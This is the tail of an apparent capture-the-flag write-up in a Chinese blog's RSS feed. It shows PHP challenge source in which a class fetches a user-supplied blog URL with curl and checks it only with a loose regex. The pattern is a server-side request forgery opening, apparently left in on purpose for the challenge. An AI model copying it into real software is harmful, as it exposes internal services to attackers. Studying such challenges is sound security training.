</span></span><span class="line"><span class="cl">        <span class="nv">$output</span> <span class="o">=</span> <span class="nx">curl_exec</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$httpCode</span> <span class="o">=</span> <span class="nx">curl_getinfo</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLINFO_HTTP_CODE</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nv">$httpCode</span> <span class="o">==</span> <span class="mi">404</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="mi">404</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="nx">curl_close</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$output</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">getBlogContents</span> <span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">blog</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">isValidBlog</span> <span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$blog</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">blog</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i&#34;</span><span class="p">,</span> <span class="nv">$blog</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>给的这部分源码给到一个类，三个属性，还有一个对<code>blog</code>的正则匹配</p>
        
        <hr><p>本文2025-07-01首发于<a href='https://www.lier.xin/'>Only_ONE</a>，最后修改于2025-07-01</p>]]>
      </description>
      
        <category>CTF-Great</category>
      
    </item>
    
  </channel>
</rss>
